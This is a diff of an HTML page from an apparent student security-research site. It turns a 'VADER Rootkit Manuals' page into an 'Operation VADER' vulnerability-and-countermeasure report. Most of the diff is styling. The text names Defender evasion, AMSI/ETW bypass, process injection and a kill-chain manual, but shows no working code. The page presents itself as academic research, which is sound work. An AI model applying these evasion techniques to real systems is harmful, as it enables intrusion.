@@ -3,2246 +3,1927 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>George Wu | VADER Rootkit Manuals — Signature Evasion & Process Injection</title>
-<meta name="description" content="VADER Rootkit Learning Manual and Execution Manual by George Wu. Signature evasion, XOR polymorphism, mutation pipeline, process injection, hardware breakpoints, DLL injection, kill chain execution. 22DIV CSEC research.">
-<meta name="keywords" content="George Wu, VADER rootkit, signature evasion, polymorphism, XOR encoding, process injection, DLL injection, hardware breakpoints, AMSI bypass, ETW bypass, kill chain, Windows security, CSEC, red team">
-<meta name="author" content="George Wu">
-<meta name="robots" content="index, follow">
-<link rel="canonical" href="https://rainfantry.github.io/rootkit.html">
-<meta property="og:type" content="article">
-<meta property="og:title" content="George Wu | VADER Rootkit Manuals — Signature Evasion & Process Injection">
-<meta property="og:description" content="Complete rootkit learning and execution manuals. XOR polymorphism, mutation pipeline, hardware breakpoint injection, kill chain execution. Original CSEC research.">
-<meta property="og:url" content="https://rainfantry.github.io/rootkit.html">
-<meta property="og:site_name" content="22DIV — George Wu">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="VADER Rootkit Manuals — George Wu">
-<meta name="twitter:description" content="Signature evasion, polymorphism, process injection, and kill chain execution. Original CSEC academic research.">
+<title>OPERATION VADER — Evidence of Vulnerability & Countermeasure</title>
 <style>
+/* ── RESET ── */
 *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
+/* ── ROOT VARIABLES ── */
 :root {
-  --bg: #0c0c0c;
-  --bg2: #111;
-  --bg3: #161616;
-  --green: #00ff41;
-  --green2: #00cc33;
-  --green3: #009922;
-  --amber: #ffb000;
-  --red: #ff4444;
-  --cyan: #00e5ff;
-  --dim: #555;
-  --muted: #888;
-  --text: #ccc;
-  --bright: #eee;
-  --blue: #4488ff;
-  --blue2: #3366cc;
-  --blue3: #2244aa;
-  --mono: 'Cascadia Code', 'Consolas', 'Source Code Pro', 'Courier New', monospace;
+  --bg-primary:   #0a0a0a;
+  --bg-secondary: #111111;
+  --bg-card:      #141414;
+  --bg-table-row: #0f0f0f;
+  --border:       #1e1e1e;
+  --border-glow:  #1a3a1a;
+  --green:        #00ff41;
+  --green-dim:    #00cc33;
+  --green-dark:   #004d14;
+  --amber:        #ffb000;
+  --amber-dim:    #cc8c00;
+  --red:          #ff3333;
+  --red-dim:      #cc2929;
+  --cyan:         #00e5ff;
+  --text-primary: #d4d4d4;
+  --text-muted:   #777777;
+  --text-dim:     #555555;
+  --mono:         'Consolas', 'Cascadia Code', 'Source Code Pro', 'Courier New', monospace;
+  --sans:         'Segoe UI', 'Inter', system-ui, -apple-system, sans-serif;
 }
 
-html { scroll-behavior: smooth; }
+html {
+  scroll-behavior: smooth;
+  scroll-padding-top: 5rem;
+}
 
 body {
-  font-family: var(--mono);
-  background: var(--bg);
-  color: var(--text);
-  line-height: 1.7;
+  font-family: var(--sans);
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  line-height: 1.6;
   min-height: 100vh;
+  overflow-x: hidden;
 }
 
+/* ── SCANLINE OVERLAY ── */
 body::after {
   content: '';
   position: fixed;
   inset: 0;
-  background: repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,255,65,0.008) 3px, rgba(0,255,65,0.008) 4px);
+  background: repeating-linear-gradient(
+    0deg,
+    transparent,
+    transparent 2px,
+    rgba(0, 255, 65, 0.015) 2px,
+    rgba(0, 255, 65, 0.015) 4px
+  );
   pointer-events: none;
-  z-index: 999;
+  z-index: 9999;
 }
 
-/* ── NAV ── */
+/* ── STICKY NAV ── */
 nav {
   position: sticky;
   top: 0;
-  background: rgba(12,12,12,0.95);
-  backdrop-filter: blur(8px);
-  border-bottom: 1px solid #1a1a1a;
-  z-index: 100;
-  padding: 0.6rem 0;
+  z-index: 1000;
+  background: rgba(10, 10, 10, 0.95);
+  backdrop-filter: blur(12px);
+  border-bottom: 1px solid var(--border);
+  padding: 0;
 }
 
-nav .inner {
-  max-width: 900px;
+.nav-inner {
+  max-width: 1200px;
   margin: 0 auto;
-  padding: 0 1.5rem;
   display: flex;
-  gap: 1.5rem;
   align-items: center;
-  flex-wrap: wrap;
+  gap: 0;
+  overflow-x: auto;
+  scrollbar-width: none;
 }
 
-nav a {
-  color: var(--green2);
+.nav-inner::-webkit-scrollbar { display: none; }
+
+.nav-brand {
+  font-family: var(--mono);
+  font-weight: 700;
+  color: var(--green);
+  padding: 0.75rem 1.25rem;
+  white-space: nowrap;
+  font-size: 0.85rem;
+  letter-spacing: 0.05em;
+  border-right: 1px solid var(--border);
+  text-decoration: none;
+}
+
+.nav-links {
+  display: flex;
+  gap: 0;
+  list-style: none;
+  overflow-x: auto;
+}
+
+.nav-links a {
+  color: var(--text-muted);
   text-decoration: none;
   font-size: 0.75rem;
-  letter-spacing: 0.08em;
-  transition: color 0.2s;
+  font-family: var(--mono);
+  padding: 0.85rem 1rem;
+  white-space: nowrap;
+  transition: color 0.2s, background 0.2s;
+  display: block;
+  letter-spacing: 0.03em;
+  text-transform: uppercase;
 }
 
-nav a:hover { color: var(--green); text-shadow: 0 0 8px rgba(0,255,65,0.4); }
-nav .brand { color: var(--green); font-weight: 600; letter-spacing: 0.12em; }
-nav a.nav-red { color: var(--red); }
-nav a.nav-red:hover { color: #ff6666; text-shadow: 0 0 8px rgba(255,68,68,0.4); }
-nav a.nav-blue { color: var(--blue); }
-nav a.nav-blue:hover { color: #6699ff; text-shadow: 0 0 8px rgba(68,136,255,0.4); }
-nav a.nav-yellow { color: var(--amber); }
-nav a.nav-yellow:hover { color: #ffc040; text-shadow: 0 0 8px rgba(255,176,0,0.4); }
-nav .sep { color: var(--dim); font-size: 0.7rem; user-select: none; }
+.nav-links a:hover {
+  color: var(--green);
+  background: rgba(0, 255, 65, 0.05);
+}
 
-.container { max-width: 900px; margin: 0 auto; padding: 2rem 1.5rem; }
+/* ── HERO / HEADER ── */
+.hero {
+  background: linear-gradient(180deg, #0d120d 0%, var(--bg-primary) 100%);
+  border-bottom: 1px solid var(--border-glow);
+  padding: 4rem 2rem 3rem;
+  text-align: center;
+  position: relative;
+  overflow: hidden;
+}
 
-/* ── HEADER ── */
-.header {
-  padding: 2rem 0 1.5rem;
-  border-bottom: 1px solid #1a1a1a;
+.hero::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 600px;
+  height: 600px;
+  background: radial-gradient(circle, rgba(0, 255, 65, 0.04) 0%, transparent 70%);
+  pointer-events: none;
+}
+
+.hero-classification {
+  font-family: var(--mono);
+  font-size: 0.7rem;
+  color: var(--amber);
+  letter-spacing: 0.15em;
+  margin-bottom: 1.5rem;
+  text-transform: uppercase;
+}
+
+.hero h1 {
+  font-family: var(--mono);
+  font-size: clamp(1.8rem, 5vw, 3rem);
+  font-weight: 700;
+  color: var(--green);
+  letter-spacing: 0.08em;
+  margin-bottom: 0.25rem;
+  text-shadow: 0 0 30px rgba(0, 255, 65, 0.15);
+  animation: glowPulse 4s ease-in-out infinite;
+}
+
+@keyframes glowPulse {
+  0%, 100% { text-shadow: 0 0 30px rgba(0, 255, 65, 0.15); }
+  50%      { text-shadow: 0 0 50px rgba(0, 255, 65, 0.25); }
+}
+
+.hero-subtitle {
+  font-family: var(--mono);
+  font-size: 0.9rem;
+  color: var(--text-muted);
+  margin-bottom: 2rem;
+  letter-spacing: 0.05em;
+}
+
+.hero-meta {
+  display: inline-flex;
+  flex-wrap: wrap;
+  gap: 1.5rem;
+  justify-content: center;
+  font-family: var(--mono);
+  font-size: 0.75rem;
+  color: var(--text-dim);
+}
+
+.hero-meta span {
+  display: flex;
+  align-items: center;
+  gap: 0.4rem;
+}
+
+.hero-meta .label {
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+}
+
+.hero-meta .value {
+  color: var(--text-primary);
+}
+
+/* ── SECTIONS ── */
+.container {
+  max-width: 1100px;
+  margin: 0 auto;
+  padding: 0 1.5rem;
+}
+
+section {
+  padding: 4rem 0;
+  border-bottom: 1px solid var(--border);
+}
+
+section:last-of-type {
+  border-bottom: none;
+}
+
+.section-header {
   margin-bottom: 2rem;
 }
 
-.header h1 {
-  font-size: 1.5rem;
-  color: var(--blue);
-  font-weight: 400;
-  letter-spacing: 0.12em;
-}
-
-.header .sub {
-  color: var(--muted);
-  font-size: 0.78rem;
-  margin-top: 0.3rem;
-}
-
-/* ── MISSION BRIEF ── */
-.brief {
-  background: var(--bg2);
-  border: 1px solid #1e1e1e;
-  border-radius: 6px;
-  padding: 1.2rem 1.5rem;
-  margin-bottom: 2.5rem;
-  font-size: 0.82rem;
-  line-height: 1.8;
-}
-
-.brief h2 {
-  color: var(--blue);
-  font-size: 0.85rem;
-  font-weight: 400;
-  letter-spacing: 0.1em;
-  margin-bottom: 0.6rem;
-}
-
-.brief p { margin-bottom: 0.6rem; }
-.brief strong { color: var(--bright); }
-
-.brief blockquote {
-  border-left: 2px solid var(--blue3);
-  padding-left: 1rem;
-  color: var(--muted);
-  margin: 0.8rem 0;
-  font-style: italic;
-}
-
-/* ── STATS ── */
-.stats {
-  display: flex;
-  gap: 2rem;
-  flex-wrap: wrap;
-  margin-bottom: 2.5rem;
-  font-size: 0.78rem;
-}
-
-.stat-box { text-align: center; }
-
-.stat-num {
-  color: var(--blue);
-  font-size: 1.4rem;
-  display: block;
-}
-
-.stat-label {
-  color: var(--dim);
-  font-size: 0.68rem;
-  letter-spacing: 0.08em;
-}
-
-/* ── MANUAL TOC SECTIONS ── */
-.manual-section {
-  margin-bottom: 2.5rem;
-}
-
-.manual-header {
-  display: flex;
-  align-items: center;
-  gap: 0.8rem;
-  margin-bottom: 0.8rem;
-  padding-bottom: 0.4rem;
-  border-bottom: 1px solid #1a1a1a;
-}
-
-.manual-tag {
-  color: var(--blue);
+.section-number {
+  font-family: var(--mono);
   font-size: 0.7rem;
+  color: var(--green-dim);
   letter-spacing: 0.15em;
-  min-width: 3.5rem;
-}
-
-.manual-title {
-  color: var(--bright);
-  font-size: 0.95rem;
-  font-weight: 400;
-}
-
-.toc-list {
-  list-style: none;
-  padding: 0;
-}
-
-.toc-list li {
-  display: flex;
-  align-items: baseline;
-  gap: 0.6rem;
-  padding: 0.35rem 0 0.35rem 1rem;
-  border-left: 1px solid #1a1a1a;
-  font-size: 0.82rem;
-  cursor: pointer;
-  border-left-color: var(--blue3);
-}
-
-.toc-list li:hover {
-  background: rgba(68,136,255,0.03);
-  border-left-color: var(--blue);
-}
-
-.toc-list li a {
-  color: var(--bright);
-  text-decoration: none;
-  flex: 1;
-}
-
-.toc-list li a:hover { color: var(--blue); }
-
-.toc-num {
-  color: var(--dim);
-  min-width: 2rem;
-  font-size: 0.72rem;
-}
-
-.toc-sub {
-  color: var(--dim);
-  font-size: 0.72rem;
-  font-style: italic;
-}
-
-.part-label {
-  color: var(--blue);
-  font-size: 0.68rem;
-  letter-spacing: 0.1em;
-  padding: 0.6rem 0 0.2rem 1rem;
-  border-left: 1px solid #1a1a1a;
-}
-
-/* ── CONTENT SECTIONS ── */
-.content-divider {
-  border: none;
-  border-top: 2px solid var(--blue3);
-  margin: 3rem 0;
-}
-
-.part-header {
-  color: var(--blue);
-  font-size: 1.2rem;
-  font-weight: 400;
-  letter-spacing: 0.1em;
-  margin-top: 3rem;
-  margin-bottom: 0.4rem;
-}
-
-.part-doctrine {
-  border-left: 2px solid var(--blue3);
-  padding-left: 1rem;
-  color: var(--muted);
-  margin: 0.5rem 0 2rem;
-  font-size: 0.82rem;
-  font-style: italic;
-}
-
-h2 {
-  color: var(--amber);
-  font-size: 1.05rem;
-  font-weight: 400;
-  margin-top: 2.5rem;
-  margin-bottom: 0.8rem;
-  padding-bottom: 0.3rem;
-  border-bottom: 1px solid #1a1a1a;
-}
-
-h3 {
-  color: var(--bright);
-  font-size: 0.92rem;
-  font-weight: 400;
-  margin-top: 1.8rem;
+  text-transform: uppercase;
   margin-bottom: 0.5rem;
 }
 
-h4 {
-  color: var(--muted);
-  font-size: 0.85rem;
-  font-weight: 400;
-  margin-top: 1.3rem;
-  margin-bottom: 0.4rem;
+.section-title {
+  font-size: 1.5rem;
+  font-weight: 700;
+  color: #f0f0f0;
+  letter-spacing: 0.02em;
 }
 
-p {
-  margin-bottom: 1rem;
-  font-size: 0.85rem;
-  line-height: 1.85;
-}
-
-strong { color: var(--bright); }
-em { color: var(--muted); font-style: italic; }
-
-code {
-  background: var(--bg3);
-  color: var(--cyan);
-  padding: 0.1rem 0.35rem;
-  border-radius: 3px;
-  font-size: 0.82rem;
-}
-
-pre {
-  background: var(--bg2);
-  border: 1px solid #1e1e1e;
+/* ── CARDS ── */
+.card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
   border-radius: 6px;
-  padding: 1rem 1.2rem;
-  margin: 1rem 0 1.5rem;
-  overflow-x: auto;
-  font-size: 0.78rem;
-  line-height: 1.7;
+  padding: 1.75rem;
+  margin-bottom: 1.5rem;
+  transition: border-color 0.3s;
 }
 
-pre code {
-  background: none;
-  color: var(--text);
-  padding: 0;
+.card:hover {
+  border-color: var(--border-glow);
 }
 
-hr {
-  border: none;
-  border-top: 1px solid #1a1a1a;
-  margin: 2.5rem 0;
+.card-title {
+  font-family: var(--mono);
+  font-size: 0.85rem;
+  color: var(--amber);
+  margin-bottom: 1rem;
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  font-weight: 600;
 }
 
+/* ── KILL CHAIN DIAGRAM ── */
+.killchain {
+  display: flex;
+  flex-direction: column;
+  gap: 0;
+  margin: 1.5rem 0;
+}
+
+.kc-phase {
+  display: grid;
+  grid-template-columns: 80px 1fr auto;
+  align-items: center;
+  gap: 1rem;
+  padding: 1rem 1.25rem;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-bottom: none;
+  transition: border-color 0.3s, background 0.3s;
+  position: relative;
+}
+
+.kc-phase:first-child { border-radius: 6px 6px 0 0; }
+.kc-phase:last-child  { border-radius: 0 0 6px 6px; border-bottom: 1px solid var(--border); }
+
+.kc-phase:hover {
+  border-color: var(--border-glow);
+  background: #161816;
+}
+
+.kc-phase::before {
+  content: '';
+  position: absolute;
+  left: 96px;
+  top: 0;
+  bottom: 0;
+  width: 2px;
+  background: var(--border);
+}
+
+.kc-label {
+  font-family: var(--mono);
+  font-size: 0.7rem;
+  color: var(--text-dim);
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  text-align: right;
+}
+
+.kc-content {
+  padding-left: 1.25rem;
+}
+
+.kc-name {
+  font-weight: 600;
+  font-size: 0.9rem;
+  color: var(--text-primary);
+  margin-bottom: 0.15rem;
+}
+
+.kc-detail {
+  font-family: var(--mono);
+  font-size: 0.72rem;
+  color: var(--text-muted);
+}
+
+.kc-status {
+  font-family: var(--mono);
+  font-size: 0.7rem;
+  font-weight: 700;
+  padding: 0.25rem 0.6rem;
+  border-radius: 3px;
+  letter-spacing: 0.04em;
+  white-space: nowrap;
+}
+
+.status-confirmed {
+  background: rgba(0, 255, 65, 0.1);
+  color: var(--green);
+  border: 1px solid rgba(0, 255, 65, 0.2);
+}
+
+.status-built {
+  background: rgba(0, 229, 255, 0.1);
+  color: var(--cyan);
+  border: 1px solid rgba(0, 229, 255, 0.2);
+}
+
+.status-notbuilt {
+  background: rgba(255, 255, 255, 0.04);
+  color: var(--text-dim);
+  border: 1px solid var(--border);
+}
+
+/* ── TABLES ── */
 table {
   width: 100%;
   border-collapse: collapse;
-  margin: 1rem 0 1.5rem;
-  font-size: 0.78rem;
+  font-size: 0.85rem;
+  margin: 1rem 0;
 }
 
-th {
+thead th {
+  font-family: var(--mono);
+  font-size: 0.72rem;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  padding: 0.75rem 1rem;
   text-align: left;
-  color: var(--blue);
-  padding: 0.4rem 0.8rem;
-  border-bottom: 1px solid var(--blue3);
-  font-weight: 400;
+  border-bottom: 2px solid var(--border);
+  background: var(--bg-secondary);
+  white-space: nowrap;
 }
 
-td {
-  padding: 0.35rem 0.8rem;
-  border-bottom: 1px solid #1a1a1a;
+tbody td {
+  padding: 0.7rem 1rem;
+  border-bottom: 1px solid var(--border);
   vertical-align: top;
 }
 
-ul, ol {
-  margin: 0.5rem 0 1rem 1.5rem;
-  font-size: 0.85rem;
+tbody tr {
+  background: var(--bg-card);
+  transition: background 0.2s;
 }
 
-li { margin-bottom: 0.3rem; }
-
-blockquote {
-  border-left: 2px solid var(--blue3);
-  padding-left: 1rem;
-  color: var(--muted);
-  margin: 1rem 0;
-  font-size: 0.85rem;
+tbody tr:nth-child(even) {
+  background: var(--bg-table-row);
 }
 
-a.xref {
+tbody tr:hover {
+  background: #191f19;
+}
+
+/* ── STATUS BADGES (inline) ── */
+.badge {
+  display: inline-block;
+  font-family: var(--mono);
+  font-size: 0.7rem;
+  font-weight: 700;
+  padding: 0.15rem 0.5rem;
+  border-radius: 3px;
+  letter-spacing: 0.03em;
+}
+
+.badge-green {
+  background: rgba(0, 255, 65, 0.12);
+  color: var(--green);
+}
+
+.badge-red {
+  background: rgba(255, 51, 51, 0.12);
+  color: var(--red);
+}
+
+.badge-amber {
+  background: rgba(255, 176, 0, 0.12);
+  color: var(--amber);
+}
+
+.badge-cyan {
+  background: rgba(0, 229, 255, 0.1);
   color: var(--cyan);
-  text-decoration: none;
-  border-bottom: 1px dotted var(--dim);
-}
-a.xref:hover { color: var(--blue); border-bottom-color: var(--blue); }
-
-/* ── EXERCISE BOX ── */
-.exercise {
-  border-left: 3px solid var(--blue);
-  background: rgba(68,136,255,0.03);
-  padding: 1rem 1.2rem;
-  margin: 1.5rem 0;
-  border-radius: 0 6px 6px 0;
 }
 
-.exercise h4 {
-  color: var(--blue);
-  font-size: 0.85rem;
-  margin-top: 0;
+.badge-dim {
+  background: rgba(255, 255, 255, 0.05);
+  color: var(--text-dim);
+}
+
+/* ── EVIDENCE BLOCK ── */
+.evidence-block {
+  background: #0c0c0c;
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--green-dark);
+  border-radius: 4px;
+  padding: 1.25rem 1.5rem;
+  font-family: var(--mono);
+  font-size: 0.8rem;
+  line-height: 1.7;
+  color: var(--green-dim);
+  margin: 1rem 0;
+  overflow-x: auto;
+  white-space: pre;
+}
+
+/* ── CVSS BAR ── */
+.cvss-bar {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  margin: 1rem 0;
+}
+
+.cvss-score {
+  font-family: var(--mono);
+  font-size: 2rem;
+  font-weight: 700;
+  color: var(--amber);
+  line-height: 1;
+}
+
+.cvss-label {
+  font-family: var(--mono);
+  font-size: 0.8rem;
+  color: var(--amber-dim);
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+}
+
+.cvss-vector {
+  font-family: var(--mono);
+  font-size: 0.7rem;
+  color: var(--text-dim);
+  margin-top: 0.25rem;
+}
+
+/* ── COMPARISON TABLE ── */
+.comparison-header-detected {
+  color: var(--red) !important;
+}
+
+.comparison-header-clean {
+  color: var(--green) !important;
+}
+
+/* ── ATTACK CHAIN STEPS ── */
+.attack-steps {
+  counter-reset: step;
+  list-style: none;
+  margin: 1.25rem 0;
+}
+
+.attack-steps li {
+  counter-increment: step;
+  padding: 0.6rem 0 0.6rem 3rem;
+  position: relative;
+  font-size: 0.88rem;
+  border-left: 2px solid var(--border);
+  margin-left: 0.75rem;
+}
+
+.attack-steps li::before {
+  content: counter(step);
+  position: absolute;
+  left: -0.85rem;
+  top: 0.55rem;
+  width: 1.6rem;
+  height: 1.6rem;
+  background: var(--bg-primary);
+  border: 2px solid var(--green-dark);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: var(--mono);
+  font-size: 0.7rem;
+  font-weight: 700;
+  color: var(--green-dim);
+}
+
+.attack-steps li:last-child {
+  border-left-color: transparent;
+}
+
+/* ── REMEDIATION LIST ── */
+.remediation-list {
+  list-style: none;
+  counter-reset: remediation;
+  margin: 1rem 0;
+}
+
+.remediation-list li {
+  counter-increment: remediation;
+  padding: 0.85rem 1rem 0.85rem 3.5rem;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 4px;
   margin-bottom: 0.5rem;
+  position: relative;
+  font-size: 0.88rem;
+  transition: border-color 0.2s;
 }
 
-.exercise p, .exercise ul, .exercise ol {
-  font-size: 0.82rem;
+.remediation-list li:hover {
+  border-color: var(--border-glow);
+}
+
+.remediation-list li::before {
+  content: counter(remediation);
+  position: absolute;
+  left: 1rem;
+  top: 50%;
+  transform: translateY(-50%);
+  font-family: var(--mono);
+  font-size: 0.75rem;
+  font-weight: 700;
+  color: var(--amber);
+  width: 1.5rem;
+  text-align: center;
+}
+
+/* ── INLINE CODE ── */
+code {
+  font-family: var(--mono);
+  background: rgba(255, 255, 255, 0.06);
+  padding: 0.15rem 0.4rem;
+  border-radius: 3px;
+  font-size: 0.82em;
+  color: var(--green-dim);
+}
+
+/* ── CONTENT TEXT ── */
+.prose {
+  font-size: 0.9rem;
+  line-height: 1.75;
+  color: var(--text-primary);
+}
+
+.prose p {
+  margin-bottom: 1rem;
+}
+
+.prose strong {
+  color: #f0f0f0;
+  font-weight: 600;
+}
+
+.highlight {
+  color: var(--green);
+  font-weight: 600;
+}
+
+.highlight-amber {
+  color: var(--amber);
+  font-weight: 600;
+}
+
+/* ── TWO-COLUMN GRID ── */
+.grid-2 {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 1.5rem;
+}
+
+@media (max-width: 768px) {
+  .grid-2 { grid-template-columns: 1fr; }
+  .kc-phase { grid-template-columns: 60px 1fr auto; gap: 0.5rem; padding: 0.75rem 1rem; }
+  .kc-phase::before { left: 72px; }
+  .hero { padding: 3rem 1.5rem 2rem; }
+  nav { position: relative; }
+  .nav-brand { padding: 0.6rem 1rem; font-size: 0.75rem; }
+  .nav-links a { padding: 0.7rem 0.75rem; font-size: 0.65rem; }
 }
 
 /* ── FOOTER ── */
 footer {
-  border-top: 1px solid #1a1a1a;
-  padding: 2rem 0;
+  background: var(--bg-secondary);
+  border-top: 1px solid var(--border);
+  padding: 2.5rem 2rem;
   text-align: center;
-  color: var(--blue);
+}
+
+.footer-brand {
+  font-family: var(--mono);
   font-size: 0.85rem;
-  font-weight: 400;
-  letter-spacing: 0.12em;
-  margin-top: 3rem;
+  color: var(--green-dim);
+  letter-spacing: 0.06em;
+  margin-bottom: 0.3rem;
 }
 
-footer a {
-  color: var(--blue);
-  text-decoration: none;
+.footer-sub {
+  font-family: var(--mono);
+  font-size: 0.7rem;
+  color: var(--text-dim);
+  letter-spacing: 0.04em;
+  margin-bottom: 0.2rem;
 }
-footer a:hover { color: #6699ff; text-shadow: 0 0 8px rgba(68,136,255,0.4); }
 
-footer .sep { color: var(--dim); margin: 0 0.5rem; }
+/* ── METHODOLOGY GRID ── */
+.method-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+  gap: 1rem;
+  margin: 1.5rem 0;
+}
 
-footer .tagline {
-  margin-top: 0.5rem;
-  opacity: 0.4;
+.method-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1.25rem;
+  transition: border-color 0.3s;
+}
+
+.method-card:hover {
+  border-color: var(--border-glow);
+}
+
+.method-card-title {
+  font-family: var(--mono);
+  font-size: 0.72rem;
+  color: var(--green-dim);
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  margin-bottom: 0.6rem;
+}
+
+.method-card p {
+  font-size: 0.85rem;
+  color: var(--text-muted);
+  line-height: 1.5;
+}
+
+/* ── HEADING ACCENTS ── */
+h3 {
+  font-size: 1.05rem;
+  font-weight: 600;
+  color: #e0e0e0;
+  margin: 1.75rem 0 0.75rem;
+}
+
+h3 code {
+  color: var(--amber);
+}
+
+/* ── BLINKING CURSOR ── */
+.cursor {
+  display: inline-block;
+  width: 2px;
+  height: 1em;
+  background: var(--green);
+  margin-left: 2px;
+  animation: blink 1s step-end infinite;
+  vertical-align: text-bottom;
+}
+
+@keyframes blink {
+  0%, 50% { opacity: 1; }
+  51%, 100% { opacity: 0; }
+}
+
+/* ── SEPARATOR ── */
+.sep {
+  height: 1px;
+  background: var(--border);
+  margin: 1.5rem 0;
+}
+
+/* ── LABEL-VALUE PAIR ── */
+.lv-grid {
+  display: grid;
+  grid-template-columns: 180px 1fr;
+  gap: 0.4rem 1rem;
+  margin: 1rem 0;
+  font-size: 0.85rem;
+}
+
+.lv-label {
+  font-family: var(--mono);
   font-size: 0.75rem;
+  color: var(--text-dim);
+  text-transform: uppercase;
+  letter-spacing: 0.04em;
 }
 
-@media (max-width: 600px) {
-  .container { padding: 1rem; }
-  .header h1 { font-size: 1.2rem; }
-  .stats { gap: 1rem; }
-  .manual-header { flex-wrap: wrap; }
-  .toc-list li { padding-left: 0.5rem; font-size: 0.78rem; }
-  pre { font-size: 0.7rem; padding: 0.8rem; }
-  table { font-size: 0.7rem; }
+.lv-value {
+  color: var(--text-primary);
 }
+
+@media (max-width: 500px) {
+  .lv-grid {
+    grid-template-columns: 1fr;
+  }
+}
+
 </style>
 </head>
 <body>
 
+<!-- ────────────── NAV ────────────── -->
 <nav>
-  <div class="inner">
-    <a href="index.html" class="brand">22DIV</a>
-    <span class="sep">|</span>
-    <a href="index.html">home</a>
-    <a href="journal.html">journal</a>
-    <a href="books.html" class="nav-red">field manual</a>
-    <a href="csec.html" class="nav-red">kill chain</a>
-    <a href="rootkit.html" class="nav-blue">rootkit manual</a>
-    <a href="fuzzer.html" class="nav-yellow">fuzzer</a>
+  <div class="nav-inner">
+    <a href="#top" class="nav-brand">VADER // EVC</a>
+    <ul class="nav-links">
+      <li><a href="#overview">Overview</a></li>
+      <li><a href="#killchain">Kill Chain</a></li>
+      <li><a href="#cwe732">CWE-732</a></li>
+      <li><a href="#hwbp">HWBP Blind Spot</a></li>
+      <li><a href="#methodology">Methodology</a></li>
+      <li><a href="#defenses">Defenses</a></li>
+      <li><a href="#remediation">Remediation</a></li>
+      <li><a href="#findings">Findings</a></li>
+      <li><a href="#rootkit">Rootkit</a></li>
+      <li><a href="#mutation">Mutation</a></li>
+      <li><a href="#stager">Stager</a></li>
+      <li><a href="#forensics">Forensics</a></li>
+    </ul>
   </div>
 </nav>
 
-<div class="container">
+<!-- ────────────── HERO ────────────── -->
+<header class="hero" id="top">
+  <div class="hero-classification">UNCLASSIFIED // ACADEMIC USE ONLY</div>
+  <h1>OPERATION VADER<span class="cursor"></span></h1>
+  <div class="hero-subtitle">Evidence of Vulnerability &amp; Countermeasure</div>
+  <div class="hero-meta">
+    <span><span class="label">Operator</span> <span class="value">george wu / 22DIV</span></span>
+    <span><span class="label">Target</span> <span class="value">Windows 11 Home 26200 (24H2)</span></span>
+    <span><span class="label">Context</span> <span class="value">Standard User, Defender RTP Enabled</span></span>
+    <span><span class="label">Course</span> <span class="value">CSEC &mdash; Tactical Cyber Operations</span></span>
+  </div>
+</header>
 
-  <!-- ── HEADER ── -->
-  <div class="header">
-    <h1>VADER ROOTKIT // MANUALS</h1>
-    <div class="sub">Signature Evasion, Polymorphism, Process Injection &amp; Kill Chain Execution</div>
+<main class="container">
+
+<!-- ════════════ SECTION 1: OVERVIEW ════════════ -->
+<section id="overview">
+  <div class="section-header">
+    <div class="section-number">Section 01</div>
+    <h2 class="section-title">Operation Overview</h2>
   </div>
 
-  <!-- ── MISSION BRIEF ── -->
-  <div class="brief">
-    <h2>// MISSION BRIEF</h2>
-    <p>Two manuals. One teaches the concepts &mdash; signature evasion, <a class="xref" href="#learn-ch4">polymorphic</a> mutation, <a class="xref" href="#learn-ch8">process injection</a>, <a class="xref" href="#learn-ch7">hardware breakpoints</a>. The other is the step-by-step execution guide &mdash; follow it top to bottom and you get a working <a class="xref" href="#learn-ch10">kill chain</a> on your own hardware.</p>
-    <blockquote>
-      1. Search for knowledge, not for 0-days<br>
-      2. See the paths, see what blocks you, find a substitute way<br>
-      3. Crash &gt; leak memory &gt; execute arbitrary code<br>
-      4. To find crashes, you need fuzzing
-    </blockquote>
-    <p><strong>Classification:</strong> UNCLASSIFIED // ACADEMIC USE ONLY. Own hardware only. CSEC academic research.</p>
-    <p><strong>Operator:</strong> VADER (george wu / 22DIV)</p>
+  <div class="prose">
+    <p>
+      Operation VADER is a modular offensive security research campaign conducted against a live Windows 11 Home system with full Defender Real-Time Protection enabled. All research is authorised academic work performed on personally-owned hardware as part of the CSEC curriculum.
+    </p>
+    <p>
+      The operation began as a TOCTOU race condition study against Windows Defender's quarantine pipeline (<strong>vader-toctou</strong>, 6 engagements, 30 findings). That campaign was defeated by Microsoft's defense-in-depth — content re-verification, single-handle architecture, kernel-mode I/O bypass. The wall held.
+    </p>
+    <p>
+      But the wall taught how it was built. Every finding from that campaign fed forward into the current toolkit. The TOCTOU research mapped Defender's internal architecture — when it checks, how it checks, what it trusts, where the seams are. That knowledge transfers to every attack surface Windows exposes.
+    </p>
   </div>
 
-  <!-- ── STATS ── -->
-  <div class="stats">
-    <div class="stat-box">
-      <span class="stat-num">10</span>
-      <span class="stat-label">CHAPTERS (LEARNING)</span>
-    </div>
-    <div class="stat-box">
-      <span class="stat-num">7</span>
-      <span class="stat-label">SECTIONS (EXECUTION)</span>
-    </div>
-    <div class="stat-box">
-      <span class="stat-num">17</span>
-      <span class="stat-label">EXERCISES</span>
-    </div>
-    <div class="stat-box">
-      <span class="stat-num">4</span>
-      <span class="stat-label">DIFFICULTY LEVELS</span>
+  <div class="card" style="margin-top: 1.5rem;">
+    <div class="card-title">Engagement Summary</div>
+    <div class="lv-grid">
+      <span class="lv-label">Total Engagements</span>
